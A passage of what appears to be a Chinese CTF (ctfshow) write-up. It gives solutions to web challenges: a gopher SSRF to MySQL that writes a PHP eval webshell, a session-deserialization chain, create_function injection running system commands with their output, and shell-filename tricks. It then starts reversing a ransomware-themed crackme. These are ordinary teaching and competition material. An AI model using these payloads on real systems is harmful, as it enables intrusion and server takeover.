data-num=\"1\"></td><td><pre>u=Username&amp;returl=gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2545%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2527%253c%253f%2570%2568%2570%2520%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2531%255d%2529%253b%253f%253e%2527%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2527%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2531%252e%2570%2568%2570%2527%2501%2500%2500%2500%2501</pre></td></tr></tbody></table></figure><p>最后访问 1.php，正常 rce</p>\n<h2 id=\"nl\"><a class=\"anchor\" href=\"#nl\">#</a> nl</h2>\n<p>Linux 中可以将文件名作为函数和参数，通过星号通配执行</p>\n<p>新建一个名称是 nl 的文件作为指令</p>\n<p><code>?1=&gt;nl</code> <br>\n 将右尖括号左侧的内容写入右侧文件，因此相当于新建了一个叫 nl 的空文件</p>\n<p><code>?1=*&gt;z</code></p>\n<p><code>*</code>  代表当前文件夹下的所有文件<br>\n <code>*&gt;z</code>  就是就是把当前文件夹的文件显示在 <code>z</code>  中<br>\n这样就只有文件 z 的内容就是 <code>nl index.php</code></p>\n<p>之后访问该文件，会自动下载该文件，文件内内容有 flag</p>\n<h2 id=\"红包题-耗子尾汁\"><a class=\"anchor\" href=\"#红包题-耗子尾汁\">#</a> 红包题 耗子尾汁</h2>\n<p>在 php 当中默认命名空间是 \\，所有原生函数和类都在这个命名空间中。普通调用一个函数，</p>\n<p>如果直接写函数名 function_name () 调用，调用的时候其实相当于写了一个相对路径；</p>\n<p>而如果写 \\function_name () 这样调用函数，则其实是写了一个绝对路径。如果你在其他 namespace 里调用系统类，就必须写绝对路径这种写法</p>\n<p>解一：<br>\n <code>a=\\system&amp;b[]=ls</code> <br>\n <code>a=\\system&amp;b[]=cat flag.php</code> <br>\n 解二：<br>\n套娃<br>\n <code>a=forward_static_call_array&amp;b[0]=system&amp;b[1][0]=ls</code></p>\n<h2 id=\"一切看起来都那么合情合理\"><a class=\"anchor\" href=\"#一切看起来都那么合情合理\">#</a> 一切看起来都那么合情合理</h2>\n<p>分析完代码，我们的思路就比较明确啦，我们可以利用 <code>index.php</code>  里面的 <code>session_start()</code>  设置，控制 $_SESSION 的值（也就是 limit）写入我们的 payload 到服务器的 <code>/tmp/sess_xxxx</code> ，然后利用 <code>nc.php </code> 里面的 <code>ini_set('session.serialize_handler', 'php')</code>  设置去反序列化服务器上的 <code>/tmp/sess_xxxx</code>  文件，从而执行 <code>inc.php</code>  里面 <code>User</code>  类的 <code>file_put_contents()</code>  函数写入一句话</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">/*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> * @Author       : zhong</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> * @since        : 2022-07-21 23:57:24</pre></td></tr><tr><td data-num=\"5\"></td><td><pre> * @LastAuthor   : zhong</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> * @lastTime     : 2022-07-22 00:31:02</pre></td></tr><tr><td data-num=\"7\"></td><td><pre> */</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">User</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$status</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"|\"</span> <span class=\"token operator\">.</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'1.php'</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"&lt;?php system('cat fl*');?&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p><code>|O:4:\"User\":3:{s:8:\"username\";s:5:\"1.php\";s:8:\"password\";s:26:\"&lt;?php system('cat fl*');?&gt;\";s:6:\"status\";N;}</code></p>\n<p>修改 <code>index.php</code>  的 <code>session</code>  值， <code>limit</code>  为上述代码得到的 base64 编码内容，之后不断提交并访问 <code>inc/inc.php</code> , 最后访问 <code>log-1.php</code></p>\n<p>得到</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>使用<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-05 16:07:03</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-06 19:21:29</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token variable\">$flag</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"ctfshow{136f0acc-0af6-4036-bea1-48e6e7ee1258}\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>登陆失败<span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token number\">2022</span><span class=\"token operator\">-</span><span class=\"token number\">07</span><span class=\"token operator\">-</span><span class=\"token number\">22</span> <span class=\"token number\">00</span><span class=\"token punctuation\">:</span><span class=\"token number\">28</span><span class=\"token punctuation\">:</span><span class=\"token number\">30</span></pre></td></tr></tbody></table></figure><h2 id=\"新年好\"><a class=\"anchor\" href=\"#新年好\">#</a> 新年好？</h2>\n<p>payload: <code>/flag?delay=2147483648</code></p>\n<p><code>setTimeout</code>  最多只能推迟执行 <code>2147483647</code>  毫秒（24.8 天），超过这个时间会发生溢出，导致回调函数将在当前任务队列结束后立即执行</p>\n<h2 id=\"红包挑战8\"><a class=\"anchor\" href=\"#红包挑战8\">#</a> 红包挑战 8</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2023-08-08 00:12:34</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2023-08-08 00:26:48</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token function\">extract</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token function\">create_function</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span><span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>该题主要用到了 create_function () 的注入漏洞</p>\n<p>对于 create_function ()，其作用为将第一个参数作为变量，第二个参数作为代码执行内容，实现原理是将代码字符串进行拼接，然后在内部使用 eval 函数，故存在与 eval 相同的漏洞</p>\n<p>如 <code>create_function('$id',$str);</code></p>\n<p>那么执行后得到的函数为</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">ft</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token variable\">$str</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>如果 <code>$str = echo $id</code></p>\n<p>那么生成的函数即为输出输入参数 <code>$id</code></p>\n<p>注入的原理即为前面所说的字符串拼接</p>\n<p>如果第一个参数可以控制，那么根据生成的函数结构，可以闭合小括号和花括号</p>\n<p>如 <code>id = ){}phpinfo();//</code></p>\n<p>那么将会得到</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">ft</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token variable\">$str</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>如果第二个参数可以控制，那么需要闭合花括号</p>\n<p>如 <code>$str =}phpinfo();//</code></p>\n<p>那么将会得到</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">ft</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token punctuation\">}</span><span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>综上，显然以上生成的字符串经过 eval，都会执行 <code>phpinfo()</code> ，故之后只要替换 <code>phpinfo()</code> ，即可 RCE</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>?name=){}system('ls');//</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>index.php</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>?name=){}system('ls /');//</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>bin dev etc flag home lib media mnt opt proc root run sbin srv sys tmp usr var</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>?name=){}system('cat /flag');//</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>ctfshow{cdc80ad7-d48a-4b86-b0fc-21c43b785613}</pre></td></tr></tbody></table></figure><h1 id=\"reverse\"><a class=\"anchor\" href=\"#reverse\">#</a> reverse</h1>\n<h2 id=\"re2\"><a class=\"anchor\" href=\"#re2\">#</a> re2</h2>\n<p>点击 <code>勒索病毒.exe</code> ，发现无论选择哪一个都无用</p>\n<p>用 ida 打开，打开 String Window，可以看到之前在控制台的文字</p>\n<p><img data-src=\"E:%5Cblog%5Csource%5C%E7%B4%A0%E6%9D%90%5Cctfshow%5Creverse%5Cre2_1.jpg\" alt=\"\"></p>\n<p>看到 <code>flag.txt</code> , 点击，查看相关函数，发现不能进入</p>\n<p>依次检查，点击 <code>DH~mqqvqxB^||zll@Jq~jkwpmvez{</code> 那一行，跟进到 <code>sub_401A70</code> ，看到下面代码</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __usercall sub_401A70@<span class=\"token operator\">&lt;</span>xmm0<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a1@<span class=\"token operator\">&lt;</span>xmm0<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>Str<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>Str1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// xmm0_4</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">char</span> v6<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+0h] [ebp-E4h]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">signed</span> <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+D0h] [ebp-14h]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">signed</span> <span class=\"token keyword\">int</span> v8<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+DCh] [ebp-8h]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">sub_40117C</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>unk_40B027<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  v8 <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>Str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> v8<span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    Str1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> Str<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">0x1F</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token function\">strcmp</span><span class=\"token punctuation\">(</span>Str1<span class=\"token punctuation\">,</span> <span class=\"token string\">\"DH~mqqvqxB^||zll@Jq~jkwpmvez{\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    v3 <span class=\"token operator\">=</span> <span class=\"token function\">sub_401037</span><span class=\"token punctuation\">(</span>a1<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token string\">\"充值成功.\\n\"</span><span class=\"token punctuation\">,</span> v6<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    v3 <span class=\"token operator\">=</span> <span class=\"token function\">sub_401037</span><span class=\"token punctuation\">(</span>a1<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token string\">\"Error!\\n\"</span><span class=\"token punctuation\">,</span> v6<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  v4 <span class=\"token operator\">=</span> Str1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token function\">LOBYTE</span><span class=\"token punctuation\">(</span>v4<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>Str1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">sub_401186</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v4<span class=\"token punctuation\">,</span> v3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>发现异或操作，使用代码解一下</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>t<span class=\"token punctuation\">:</span> <span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"DH~mqqvqxB^||zll@Jq~jkwpmvez{\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>b <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> t<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    b <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token number\">0x1F</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><p>运行后，得到 <code>[Warnning]Access_Unauthorized</code></p>\n<p>之后点击第二行的加密，跟进 <code>sub_4014E0</code> ，得到代码</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __usercall sub_4014E0@<span class=\"token operator\">&lt;</span>xmm0<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a1@<span class=\"token operator\">&lt;</span>xmm0<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>Str<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> a3<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> a4<span class=\"token punctuation\">,</span> FILE <span class=\"token operator\">*</span>File<span class=\"token punctuation\">,</span> FILE <span class=\"token operator\">*</span>a6<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v6<span class=\"token punctuation\">;</span> <span class=\"token comment\">// xmm0_4</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">int</span> v7<span class=\"token punctuation\">;</span> <span class=\"token comment\">// xmm0_4</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">int</span> v8<span class=\"token punctuation\">;</span> <span class=\"token comment\">// xmm0_4</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">int</span> v9<span class=\"token punctuation\">;</span> <span class=\"token comment\">// xmm0_4</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">int</span> v10<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">int</span> v11<span class=\"token punctuation\">;</span> <span class=\"token comment\">// xmm0_4</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">int</span> v12<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">int</span> v13<span class=\"token punctuation\">;</span> <span class=\"token comment\">// xmm0_4</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">int</span> v14<span class=\"token punctuation\">;</span> <span class=\"token comment\">// xmm0_4</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">int</span> v15<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">char</span> v17<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+0h] [ebp-D8h]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token keyword\">int</span> v18<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+D0h] [ebp-8h]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token function\">sub_40117C</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>unk_40B027<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  v18 <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>Str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  v6 <span class=\"token operator\">=</span> <span class=\"token function\">sub_4010F0</span><span class=\"token punctuation\">(</span>a1<span class=\"token punctuation\">,</span> a3<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>Str<span class=\"token punctuation\">,</span> v18<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  v7 <span class=\"token operator\">=</span> <span class=\"token function\">sub_4010C8</span><span class=\"token punctuation\">(</span>v6<span class=\"token punctuation\">,</span> a4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  v8 <span class=\"token operator\">=</span> <span class=\"token function\">sub_40116D</span><span class=\"token punctuation\">(</span>v7<span class=\"token punctuation\">,</span> a4<span class=\"token punctuation\">,</span> a3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  v9 <span class=\"token operator\">=</span> <span class=\"token function\">sub_4010EB</span><span class=\"token punctuation\">(</span>v8<span class=\"token punctuation\">,</span> a4<span class=\"token punctuation\">,</span> File<span class=\"token punctuation\">,</span> a6<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  v10 <span class=\"token operator\">=</span> <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span>File<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  v11 <span class=\"token operator\">=</span> <span class=\"token function\">sub_401186</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>v17 <span class=\"token operator\">==</span> <span class=\"token operator\">&amp;</span>v17<span class=\"token punctuation\">,</span> v10<span class=\"token punctuation\">,</span> v9<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  v12 <span class=\"token operator\">=</span> <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span>a6<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  v13 <span class=\"token operator\">=</span> <span class=\"token function\">sub_401186</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>v17 <span class=\"token operator\">==</span> <span class=\"token operator\">&amp;</span>v17<span class=\"token punctuation\">,</span> v12<span class=\"token punctuation\">,</span> v11<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  v14 <span class=\"token operator\">=</span> <span class=\"token function\">sub_401037</span><span class=\"token punctuation\">(</span>v13<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token string\">\"\\n加密成功!\\n您的充值金额不足。\\n\\n\"</span><span class=\"token punctuation\">,</span> v17<span class=\"token punctuation\">)</span><span class=\"token 